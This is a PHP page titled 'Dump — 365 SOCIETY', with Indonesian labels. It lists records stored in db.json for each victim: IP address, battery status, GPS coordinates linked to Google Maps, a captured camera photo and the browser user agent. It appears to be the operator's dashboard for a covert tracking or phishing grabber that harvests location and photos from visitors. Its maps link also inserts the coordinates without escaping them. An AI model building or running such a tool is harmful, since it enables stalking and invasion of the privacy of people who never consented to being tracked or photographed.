<?php
$data = file_exists('db.json') ? json_decode(file_get_contents('db.json'), true) : [];
if (!is_array($data)) $data = [];
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Dump — 365 SOCIETY</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body {
        font-family: 'Courier New', monospace;
        background: #0a0a0a;
        color: #e0e0e0;
        padding: 20px;
        min-height: 100vh;
    }
    
    .header {
        text-align: center;
        margin-bottom: 30px;
        padding-bottom: 20px;
        border-bottom: 2px solid #8b0000;
    }
    
    .header h1 {
        color: #ff2a2a;
        font-size: 26px;
        letter-spacing: 3px;
        text-shadow: 0 0 10px rgba(255, 42, 42, 0.5);
        margin-bottom: 6px;
    }
    
    .header .sub {
        color: #666;
        font-size: 13px;
        letter-spacing: 1px;
    }
    
    .stats {
        background: #111;
        padding: 14px 18px;
        border-radius: 10px;
        margin-bottom: 24px;
        border-left: 3px solid #ff2a2a;
        display: flex;
        gap: 24px;
        flex-wrap: wrap;
        font-size: 13px;
    }
    
    .stats .stat {
        color: #888;
    }
    
    .stats .stat span {
        color: #ff2a2a;
        font-weight: bold;
    }
    
    .entry {
        background: #111;
        border: 1px solid #1e1e1e;
        padding: 18px;
        margin-bottom: 16px;
        border-radius: 12px;
        border-left: 3px solid #8b0000;
        transition: 0.2s;
    }
    
    .entry:hover {
        border-left-color: #ff2a2a;
        box-shadow: 0 0 20px rgba(255, 42, 42, 0.1);
    }
    
    .entry-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 14px;
        padding-bottom: 10px;
        border-bottom: 1px solid #1e1e1e;
        flex-wrap: wrap;
        gap: 8px;
    }
    
    .entry-header .time {
        color: #ff2a2a;
        font-size: 13px;
        font-weight: bold;
    }
    
    .entry-header .ip {
        color: #fff;
        font-size: 13px;
        background: #1a1a1a;
        padding: 4px 12px;
        border-radius: 6px;
        border: 1px solid #2a2a2a;
    }
    
    .section {
        margin-bottom: 14px;
    }
    
    .section:last-child {
        margin-bottom: 0;
    }
    
    .section-title {
        color: #ff2a2a;
        font-size: 11px;
        letter-spacing: 2px;
        margin-bottom: 8px;
        text-transform: uppercase;
        font-weight: bold;
    }
    
    .row {
        display: flex;
        padding: 5px 0;
        font-size: 13px;
        flex-wrap: wrap;
        gap: 8px;
    }
    
    .row .label {
        color: #666;
        min-width: 130px;
    }
    
    .row .value {
        color: #e0e0e0;
        word-break: break-all;
        flex: 1;
    }
    
    .row .value.danger {
        color: #ff2a2a;
        font-weight: bold;
    }
    
    .row .value.warn {
        color: #ffaa00;
        font-weight: bold;
    }
    
    .row .value.safe {
        color: #4cd9a0;
        font-weight: bold;
    }
    
    /* Battery bar */
    .battery-container {
        display: flex;
        align-items: center;
        gap: 10px;
        flex: 1;
    }
    
    .battery-bar {
        width: 120px;
        height: 16px;
        background: #1a1a1a;
        border: 1px solid #2a2a2a;
        border-radius: 8px;
        overflow: hidden;
        position: relative;
    }
    
    .battery-fill {
        height: 100%;
        background: linear-gradient(90deg, #ff2a2a, #ff5555);
        transition: width 0.3s;
        border-radius: 7px;
    }
    
    .battery-fill.low {
        background: linear-gradient(90deg, #ff2a2a, #ff0000);
    }
    
    .battery-fill.medium {
        background: linear-gradient(90deg, #ffaa00, #ffcc00);
    }
    
    .battery-fill.high {
        background: linear-gradient(90deg, #4cd9a0, #6ee7b7);
    }
    
    .charging-badge {
        font-size: 11px;
        padding: 3px 10px;
        border-radius: 12px;
        font-weight: bold;
    }
    
    .charging-badge.yes {
        background: rgba(76, 217, 160, 0.15);
        color: #4cd9a0;
        border: 1px solid #4cd9a0;
    }
    
    .charging-badge.no {
        background: rgba(255, 42, 42, 0.15);
        color: #ff2a2a;
        border: 1px solid #ff2a2a;
    }
    
    /* Location */
    .maps-link {
        display: inline-block;
        color: #ff2a2a;
        text-decoration: none;
        border: 1px solid #8b0000;
        padding: 6px 14px;
        border-radius: 8px;
        font-size: 12px;
        margin-top: 8px;
        transition: 0.2s;
        letter-spacing: 1px;
    }
    
    .maps-link:hover {
        background: #8b0000;
        color: #fff;
        box-shadow: 0 0 15px rgba(255, 42, 42, 0.3);
    }
    
    /* Photo */
    .photo-container {
        margin-top: 8px;
    }
    
    .photo-container img {
        max-width: 100%;
        max-height: 300px;
        border-radius: 10px;
        border: 1px solid #2a2a2a;
        display: block;
    }
    
    /* User Agent */
    .ua-box {
        background: #0a0a0a;
        padding: 10px 12px;
        border-radius: 8px;
        border: 1px solid #1e1e1e;
        font-size: 11px;
        color: #888;
        word-break: break-all;
        line-height: 1.5;
        margin-top: 4px;
    }
    
    /* No data */
    .no-data {
        text-align: center;
        padding: 60px 20px;
        color: #444;
        font-size: 14px;
        letter-spacing: 1px;
    }
    
    .no-data .icon {
        font-size: 48px;
        display: block;
        margin-bottom: 16px;
        opacity: 0.3;
    }
    
    /* Copyright */
    .copyright {
        text-align: center;
        margin-top: 40px;
        padding-top: 20px;
        border-top: 1px solid #1a1a1a;
        color: #444;
        font-size: 12px;
        letter-spacing: 2px;
    }
    
    .copyright span {
        color: #ff2a2a;
        font-weight: bold;
    }
    
    @media (max-width: 500px) {
        .row .label { min-width: 100px; font-size: 12px; }
        .row .value { font-size: 12px; }
        .header h1 { font-size: 20px; }
        .entry-header { flex-direction: column; align-items: flex-start; }
    }
</style>
</head>
<body>

<div class="header">
    <h1>⬢ DUMP ⬢</h1>
    <div class="sub">365 SOCIETY · DATA LOG</div>
</div>

<?php if (empty($data)): ?>
    <div class="no-data">
        <span class="icon">📭</span>
        Belum ada data masuk.
    </div>
<?php else: ?>

<div class="stats">
    <div class="stat">TOTAL: <span><?= count($data) ?></span></div>
    <div class="stat">TERAKHIR: <span><?= htmlspecialchars(end($data)['time'] ?? '-') ?></span></div>
    <div class="stat">SEKARANG: <span><?= date('Y-m-d H:i:s') ?></span></div>
</div>

<?php foreach (array_reverse($data) as $d): ?>
<div class="entry">
    <div class="entry-header">
        <span class="time">🕐 <?= htmlspecialchars($d['time'] ?? '-') ?></span>
        <span class="ip">🌐 <?= htmlspecialchars($d['ip'] ?? '-') ?></span>
    </div>
    
    <!-- BATERAI -->
    <?php if (!empty($d['battery_level'])): ?>
    <div class="section">
        <div class="section-title">🔋 Baterai</div>
        <div class="row">
            <span class="label">Level</span>
            <div class="battery-container">
                <?php 
                    $lvl = intval($d['battery_level']);
                    $cls = $lvl < 20 ? 'low' : ($lvl < 50 ? 'medium' : 'high');
                ?>
                <span class="value"><?= htmlspecialchars($d['battery_level']) ?></span>
                <div class="battery-bar">
                    <div class="battery-fill <?= $cls ?>" style="width: <?= $lvl ?>%"></div>
                </div>
            </div>
        </div>
        <div class="row">
            <span class="label">Status Cas</span>
            <span class="value">
                <?php if (($d['battery_charging'] ?? '') === 'Ya'): ?>
                    <span class="charging-badge yes">⚡ SEDANG CAS</span>
                <?php else: ?>
                    <span class="charging-badge no">🔌 TIDAK CAS</span>
                <?php endif; ?>
            </span>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- LOKASI -->
    <?php if (!empty($d['lat'])): ?>
    <div class="section">
        <div class="section-title">📍 Lokasi</div>
        <div class="row">
            <span class="label">Latitude</span>
            <span class="value"><?= htmlspecialchars($d['lat']) ?></span>
        </div>
        <div class="row">
            <span class="label">Longitude</span>
            <span class="value"><?= htmlspecialchars($d['lng']) ?></span>
        </div>
        <?php if (!empty($d['accuracy'])): ?>
        <div class="row">
            <span class="label">Akurasi</span>
            <span class="value"><?= htmlspecialchars($d['accuracy']) ?></span>
        </div>
        <?php endif; ?>
        <a href="https://www.google.com/maps?q=<?= $d['lat'] ?>,<?= $d['lng'] ?>" target="_blank" class="maps-link">🗺️ BUKA GOOGLE MAPS</a>
    </div>
    <?php endif; ?>
    
    <!-- FOTO -->
    <?php if (!empty($d['foto']) && file_exists($d['foto'])): ?>
    <div class="section">
        <div class="section-title">📸 Foto</div>
        <div class="photo-container">
            <img src="<?= htmlspecialchars($d['foto']) ?>" alt="Foto">
        </div>
    </div>
    <?php endif; ?>
    
    <!-- USER AGENT -->
    <?php if (!empty($d['user_agent'])): ?>
    <div class="section">
        <div class="section-title">🔍 User Agent</div>
        <div class="ua-box"><?= htmlspecialchars($d['user_agent']) ?></div>
    </div>
    <?php endif; ?>
    
</div>
<?php endforeach; ?>

<?php endif; ?>

<!-- COPYRIGHT -->
<div class="copyright">
    © 2026 · <span>365 SOCIETY</span>
</div>

</body>
</html>